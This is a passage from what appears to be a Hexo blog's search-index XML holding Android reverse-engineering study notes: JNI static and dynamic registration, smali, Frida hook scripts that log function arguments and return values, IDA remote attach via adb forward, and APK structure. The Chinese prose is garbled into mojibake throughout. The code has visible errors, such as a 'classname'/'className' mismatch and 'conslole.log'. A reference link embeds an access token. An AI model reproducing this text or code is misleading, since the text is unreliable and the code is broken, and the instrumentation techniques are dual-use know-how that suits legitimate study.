(*DestroyJavaVM)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThread)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">    <span class="built_in">jint</span>        (*DetachCurrentThread)(JavaVM*);</span><br><span class="line">    <span class="built_in">jint</span>        (*GetEnv)(JavaVM*, <span class="type">void</span>**, jint);</span><br><span class="line">    <span class="built_in">jint</span>        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, <span class="type">void</span>*);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="4"><li>JNIEnv</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span> &#123;</span><br><span class="line">   <span class="comment">// xxx æ¯”è¾ƒå¤š</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>native methodï¼Œç­¾åæœ‰ä¸ªå…·ä½“çš„è¡¨</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;</span><br><span class="line">    <span class="type">void</span>*       fnPtr;</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure><h3 id="é™æ€æ³¨å†Œ"><a href="#é™æ€æ³¨å†Œ" class="headerlink" title="é™æ€æ³¨å†Œ"></a>é™æ€æ³¨å†Œ</h3><ol><li>é™æ€æ³¨å†Œçš„å‡½æ•°åä¸€èˆ¬ä¸º <code>Java_åŒ…å_ç±»å_å‡½æ•°å</code> å°†åŒ…åä¸­çš„ <code>.</code> æ›¿æ¢ä¸º <code>_</code> å°±æ˜¯nativeå±‚å‡½æ•°çš„åç§°</li><li>å‡½æ•°ï¼šä»<code>jni.h</code> å¯ä»¥çœ‹å‡ºï¼Œç¬¬ä¸€ä¸ªæ˜¯JNIEnvï¼Œç¬¬äºŒä¸ªä¸ºjclassï¼Œç„¶åå°±æ˜¯Javaå±‚ä»£ç çš„å‚æ•°</li><li>android studio åˆ›å»ºä¸€ä¸ªnative C++ é»˜è®¤ä¸ºé™æ€æ³¨å†Œ</li></ol><p>native-lib.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> </span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL  </span></span><br><span class="line"><span class="function"><span class="title">Java_com_learn_native_1lib_MainActivity_stringFromJNI</span><span class="params">(  </span></span></span><br><span class="line"><span class="params"><span class="function">        JNIEnv* env,  </span></span></span><br><span class="line"><span class="params"><span class="function">        jobject <span class="comment">/* this */</span>)</span> </span>&#123;  </span><br><span class="line">    std::string hello = <span class="string">&quot;Hello from C++&quot;</span>;  </span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(hello.<span class="built_in">c_str</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javaå±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.learn.native_lib;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;  </span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.learn.native_lib.databinding.ActivityMainBinding;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Used to load the &#x27;native_lib&#x27; library on application startup.  </span></span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native_lib&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);  </span><br><span class="line">  </span><br><span class="line">        binding = ActivityMainBinding.inflate(getLayoutInflater());  </span><br><span class="line">        setContentView(binding.getRoot());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// Example of a call to a native method  </span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> binding.sampleText;  </span><br><span class="line">        tv.setText(stringFromJNI());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the &#x27;native_lib&#x27; native library,     </span></span><br><span class="line"><span class="comment">     * which is packaged with this application.     </span></span><br><span class="line"><span class="comment">     * */</span>    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¨¡æ‹Ÿå™¨è¿è¡Œ + jadxåç¼–è¯‘ + ida æ‰“å¼€soæ–‡ä»¶</p><h3 id="åŠ¨æ€æ³¨å†Œ"><a href="#åŠ¨æ€æ³¨å†Œ" class="headerlink" title="åŠ¨æ€æ³¨å†Œ"></a>åŠ¨æ€æ³¨å†Œ</h3><ol><li>å‡½æ•°åä¸ç”¨è¿™ä¹ˆé•¿ï¼Œä½†æ˜¯ä¸€èˆ¬ä¼šä¸Javaå±‚çš„åç§°ç›¸åŒï¼Œæ–¹ä¾¿å¼€å‘</li><li>JNI_Onload å‡½æ•°ï¼ŒåŠ¨æ€æ³¨å†Œ</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> classname <span class="string">&quot;com/learn/native_demo/MainActivity&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> jclass myClass;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">JNIEnv* env = <span class="literal">NULL</span>; </span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//1. ä»JavaVMè·å–JNIEnvï¼Œè¿™é‡Œä½¿ç”¨1.4çš„ç‰ˆæœ¬</span></span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. è·å–æ˜ å°„çš„javaç±»</span></span><br><span class="line">    myClass = env-&gt;<span class="built_in">FindClass</span>(className);</span><br><span class="line">    <span class="keyword">if</span>(myClass == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot get class:%s\n&quot;</span>, className);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. é€šè¿‡RegisterNativesæ–¹æ³•åŠ¨æ€æ³¨å†Œ</span></span><br><span class="line">    <span class="keyword">if</span>(env-&gt;<span class="built_in">RegisterNatives</span>(myClass, gMethods, <span class="built_in">sizeof</span>(gMethods)/<span class="built_in">sizeof</span>(gMethods[<span class="number">0</span>])) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;register native method failed!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. è¿”å›ç‰ˆæœ¬ï¼Œå¦åˆ™åŠ è½½ä¼šå¤±è´¥ã€‚</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;                  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>åŠ¨æ€æ³¨å†Œï¼Œä¸»è¦é JNIEnvçš„RegisterNativeså‡½æ•°</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">RegisterNatives</span><span class="params">(jclass clazz, <span class="type">const</span> JNINativeMethod* methods,</span></span></span><br><span class="line"><span class="params"><span class="function">        jint nMethods)</span></span></span><br></pre></td></tr></table></figure><ol start="4"><li>æˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰ JNINativeMethod æ•°ç»„</li></ol><ul><li><code>getNativeString</code>ä¸ºJavaç±»ä¸­å®šä¹‰çš„Nativeæ–¹æ³•åã€‚</li><li><code>()Ljava/lang/String;</code> ä¸ºæ–¹æ³•çš„ç­¾åï¼Œ <code>()</code>è¡¨ç¤ºè¯¥æ–¹æ³•æ— å‚æ•°</li><li><code>reinterpret_cast&lt;void*&gt;(getString)</code> ä¸ºNativeå®ç°çš„æ–¹æ³•åã€‚è¿™é‡Œå¼ºåˆ¶è½¬æ¢æˆäº†å‡½æ•°æŒ‡é’ˆã€‚</li><li>è¿™äº›å‡½æ•°éƒ½éœ€è¦æˆ‘ä»¬å®ç°</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;getNativeString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(getString)&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="smali-è¯­æ³•"><a href="#smali-è¯­æ³•" class="headerlink" title="smali è¯­æ³•"></a>smali è¯­æ³•</h2><p>Dalvik è™šæ‹Ÿæœºï¼šDalvik æ˜¯ Google ä¸“é—¨ä¸º Android å¹³å°è®¾è®¡çš„è™šæ‹Ÿæœºã€‚è™½ç„¶ Android ç¨‹åºå¯ä»¥ä½¿ç”¨ Java è¯­è¨€æ¥è¿›è¡Œå¼€å‘ï¼Œä½† Dalvik VM å’Œ Java VM æ˜¯ä¸¤æ¬¾ä¸åŒçš„è™šæ‹Ÿæœºã€‚Dalvik VM åŸºäºå¯„å­˜å™¨ï¼Œè€Œ Java VM åŸºäºæ ˆ ã€‚Dalvik VM æœ‰ä¸“é—¨çš„æ–‡ä»¶æ‰§è¡Œæ ¼å¼ dex (Dalvik Executable)ï¼Œè€Œ Java VM åˆ™æ‰§è¡Œçš„æ˜¯ Java å­—èŠ‚ç ã€‚DVM æ¯” JVM é€Ÿåº¦æ›´å¿«ï¼Œå ç”¨çš„ç©ºé—´æ›´å°‘ã€‚</p><p>ä¸å¿…è¦æ­»è®°ç¡¬èƒŒï¼Œä½¿ç”¨æ—¶æŸ¥è¡¨ï¼Œç”¨ç€å°±ç†Ÿæ‚‰äº†</p><p><a href="https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/">Smali - CTF Wiki (ctf-wiki.org)</a></p><h2 id="Firda"><a href="#Firda" class="headerlink" title="Firda"></a>Firda</h2><blockquote><p>åªèƒ½è¯´å¤šçœ‹å®˜æ–¹æ–‡æ¡£</p></blockquote><p>å‘½ä»¤ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ—§ç‰ˆ </span></span><br><span class="line">frida -U &lt;package_name&gt; -l hook.js  --no-pause</span><br><span class="line"><span class="comment"># æ–°ç‰ˆé»˜è®¤ä¸ä¼šæš‚åœï¼Œä½¿ç”¨--pause æš‚åœ ã€‚</span></span><br><span class="line">frida-ps -Uai  // è·å¾—åç§°</span><br><span class="line">frida -U  &lt;name&gt; -l hook.js </span><br></pre></td></tr></table></figure><p>æŸäº›æ–¹æ³•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–ç¯å¢ƒå˜é‡ï¼Œå°±æ˜¯è·å– JNIEnv ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥è°ƒç”¨JNIEnvçš„æ–¹æ³•</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç±»å‹è½¬åŒ–</span></span><br><span class="line"><span class="title function_">hexdump</span>()</span><br><span class="line"><span class="title function_">readCString</span>() </span><br><span class="line"><span class="title function_">toInt32</span>()</span><br></pre></td></tr></table></figure><h3 id="native-hook"><a href="#native-hook" class="headerlink" title="native hook"></a>native hook</h3><ol><li>è·å¾—soåŸºå€</li><li>è·å¾—å‡½æ•°åŸºå€ï¼Œè¿›è¡Œattachï¼Œä¸¤ä¸ªæ–¹æ³•ï¼Œè¿›å…¥å‡½æ•°(onEnter)å’Œé€€å‡ºå‡½æ•°(onLeave)çš„æ“ä½œ</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> lib_name = <span class="string">&quot;xxx.so&quot;</span></span><br><span class="line">  <span class="keyword">let</span> func_offset = <span class="number">0x114514</span>;</span><br><span class="line">  <span class="keyword">let</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(lib_name);</span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc base: &quot;</span> + libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¸€èˆ¬soå±‚å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯JniEnvï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯jclass</span></span><br><span class="line">  <span class="keyword">let</span> func_addr = libc_base.<span class="title function_">add</span>(func_offset);</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">      <span class="comment">// console.log(&quot;args[0] = \n&quot; + hexdump(args[0]));</span></span><br><span class="line">      <span class="comment">// console.log(&quot;args[1] = \n&quot; + hexdump(args[1]));</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">2</span>]));</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">3</span>]));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;function return&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;return =&gt; &quot;</span> + <span class="title function_">hexdump</span>(retval));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><blockquote><p>å¡æ­»çš„å‡ ç‡æ¯”è¾ƒé«˜</p></blockquote><ol><li>è·å¾—æŒ‡ä»¤çš„åœ°å€</li><li>æ‰“å°ä¸Šä¸‹æ–‡ context</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>))</span><br><span class="line">    <span class="comment">// å…·ä½“çš„å¯„å­˜å™¨å€¼</span></span><br><span class="line">    conslole.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="IDA-Attach"><a href="#IDA-Attach" class="headerlink" title="IDA Attach"></a>IDA Attach</h2><blockquote><p>IDA yyds</p></blockquote><ol><li>æ‰‹æœºå¯åŠ¨ IDA Pro <code>dbgsrv</code> ä¸­çš„ android_server(x86_64 æˆ–è€… arm æ ¹æ®æœºå‹é€‰æ‹©)</li><li>ç«¯å£è½¬å‘</li><li>IDA Pro é¡¶æ  Debugger -&gt; Attach -&gt; Remote Android debugger</li></ol><p>éœ€è¦ç«¯å£è½¬å‘æ‰èƒ½attachï¼Œå°†androidç«¯å£è½¬å‘ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://developer.android.com/reference/android/os/Bundle">Bundle Android Developers</a></li><li><a href="https://frida.re/docs/home/">Frida â€¢ A world-class dynamic instrumentation toolkit</a></li><li><a href="https://zhuanlan.zhihu.com/p/520523247?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg3NDkwNTMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODc0ODc1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1Mjk0Njk4M30.3D24gUz7Zah8RqqqLRzUIr5z1PlHm7nDF22mMsj6zBw">JNIåŠ¨æ€æ³¨å†Œã€é™æ€æ³¨å†Œå®ä¾‹åŠå…¶å®ç°åŸç†åˆ†æ</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-1</title>
      <link href="/2023/10/08/Android-1/"/>
      <url>/2023/10/08/Android-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸è¯¥ç‚¹å¼€é‚£ä¸€ç¯‡æ¨æ–‡ã€‚</p></blockquote><span id="more"></span><ul><li>è…¾è®¯ç„æ­¦å®éªŒå®¤ä¸€ç¯‡å…³äºARM çš„æ–‡ç« </li></ul><p><a href="https://8ksec.io/arm64-reversing-and-exploitation-part-7-bypassing-aslr-and-nx/">ARM64 Reversing And Exploitation Part 7 â€“ Bypassing ASLR and NX - 8kSec</a></p><p>ä½†æ˜¯çœ‹å®Œäº†è¿™ç¯‡æ–‡ç« ï¼Œçªç„¶æƒ³å­¦ä¸€å­¦å®‰å“å®‰å…¨ç›¸å…³çš„å†…å®¹</p><h2 id="Android-ç¯å¢ƒæ­å»º"><a href="#Android-ç¯å¢ƒæ­å»º" class="headerlink" title="Android ç¯å¢ƒæ­å»º"></a>Android ç¯å¢ƒæ­å»º</h2><h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><ul><li>åœ¨windows å’Œ Linux ä¸‹æ­å»ºã€‚æ¯”è¾ƒç®€å•çš„æ–¹å¼ï¼šä½¿ç”¨Android Studio</li></ul><ol><li>ä¸‹è½½ Javaï¼Œé…ç½®ç¯å¢ƒå˜é‡ã€‚</li></ol><p>Linux ä½¿ç”¨åŒ…ç®¡ç†å™¨è¿›è¡Œå®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure><p>windows ä¸‹åœ¨oracleä¸‹è½½ <a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a>ï¼Œç„¶åé…ç½®</p><ol start="2"><li>ä¸‹è½½android studioï¼Œä½¿ç”¨<a href="https://www.jetbrains.com/zh-cn/lp/toolbox/">JetBrains Toolbox</a></li><li>ä¸‹è½½ Android SDKï¼ŒAndroid studio æ‰“å¼€åå¦‚æœæ²¡æœ‰sdkä¼šè‡ªè¡Œä¸‹è½½ï¼Œä½†æ˜¯æœ‰å¢™ï¼Œä¸ä¸€å®šä¼šä¸‹è½½æˆåŠŸï¼Œä½†æ˜¯æ€»æœ‰è§£å†³é—®é¢˜çš„æ–¹æ³•ï¼ˆ</li><li>path: ä¸‹è½½sdkåï¼Œå°† <code>xxx\platform-tools</code> åŠ å…¥ç¯å¢ƒå˜é‡ï¼Œå°±å¯ä»¥ä½¿ç”¨adbã€‚ç¿»ç¿»ä¸‹è½½çš„ç›®å½•ï¼Œå¯èƒ½æœ‰å…¶ä½™æœ‰è¶£çš„å·¥å…·ï¼Œæ¯”å¦‚qemu</li></ol><h3 id="è¿è¡Œapk"><a href="#è¿è¡Œapk" class="headerlink" title="è¿è¡Œapk"></a>è¿è¡Œapk</h3><ol><li>æ¨¡æ‹Ÿå™¨</li></ol><ul><li>åœ¨å®‰è£… WSL2 åå¯¼è‡´å¤§éƒ¨åˆ†æ¨¡æ‹Ÿå™¨ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä»¥å®‰è£…WSAï¼Œä½†æ˜¯ä¸‡ä¸€å­˜åœ¨ æ¶æ„è½¯ä»¶ å°±ä¼šå¾ˆéš¾æ</li></ul><p><a href="https://www.bluestacks.cn/">BlueStackså®‰å“æ¨¡æ‹Ÿå™¨</a>ï¼Œé…ç½®åï¼Œä»¥<strong>ç®¡ç†å‘˜è¿è¡Œ</strong>ï¼Œä¸ä¼šå¤±è´¥</p><ul><li>rootï¼šæˆ‘åœ¨ä¿®æ”¹äº†é…ç½®æ–‡ä»¶åå°±æˆåŠŸäº†ã€‚<a href="https://appuals.com/root-bluestacks/">How to Root Bluestacks on Windows Easily?</a></li></ul><ol start="2"><li>root çœŸæœºï¼Œè¿™ä¸ªæ‰æ˜¯æœ€å¥½çš„æ–¹æ³•ã€‚<del>ä½†æ˜¯ä¹°ä¸èµ·</del></li></ol><ul><li>æ¨èï¼Œå› ä¸ºæœ‰çš„ä¸ç»™å‡ºx86çš„libåº“</li><li>å¯ä»¥åœ¨å¹³å°ä¹°ä¸ªäºŒæ‰‹çš„æ‰‹æœº</li></ul><h2 id="é€†å‘å·¥å…·"><a href="#é€†å‘å·¥å…·" class="headerlink" title="é€†å‘å·¥å…·"></a>é€†å‘å·¥å…·</h2><h3 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h3><ul><li><a href="https://github.com/skylot/jadx">jadx</a></li><li><a href="https://www.pnfsoftware.com/jeb/">JEB Decompiler</a></li><li><a href="https://hex-rays.com/IDA-pro/">IDA Pro</a></li><li><a href="https://github.com/NationalSecurityAgency/ghidra">ghidra</a></li></ul><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><ul><li><a href="https://pypi.org/project/frida-tools/">frida-tools</a></li><li><a href="https://github.com/frida/frida/releases">firda server</a></li></ul><h3 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h3><h2 id="APKç»“æ„"><a href="#APKç»“æ„" class="headerlink" title="APKç»“æ„"></a>APKç»“æ„</h2><ul><li>APK, æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªzipæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ–‡ä»¶åç¼€ç„¶åè§£å‹ã€‚</li></ul><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>ç”¨äºå­˜æ”¾éœ€è¦æ‰“åŒ…åˆ°APKä¸­çš„é™æ€æ–‡ä»¶</p><p>assetsç›®å½•<strong>æ”¯æŒä»»æ„æ·±åº¦çš„å­ç›®å½•</strong>ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚ä»»æ„éƒ¨ç½²æ–‡ä»¶å¤¹æ¶æ„ã€‚</p><h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><p>å­˜æ”¾çš„æ˜¯ç­¾åä¿¡æ¯ï¼Œç”¨æ¥ä¿è¯apkåŒ…çš„å®Œæ•´æ€§å’Œç³»ç»Ÿçš„å®‰å…¨ã€‚</p><p>åœ¨ç¼–è¯‘ç”Ÿæˆä¸€ä¸ªapkåŒ…æ—¶ï¼Œä¼šå¯¹æ‰€æœ‰è¦æ‰“åŒ…çš„æ–‡ä»¶åšä¸€ä¸ªæ ¡éªŒè®¡ç®—ï¼Œå¹¶æŠŠè®¡ç®—ç»“æœæ”¾åœ¨META-INFç›®å½•ä¸‹ã€‚åœ¨å®‰è£…æ—¶ï¼Œå¦‚æœæ 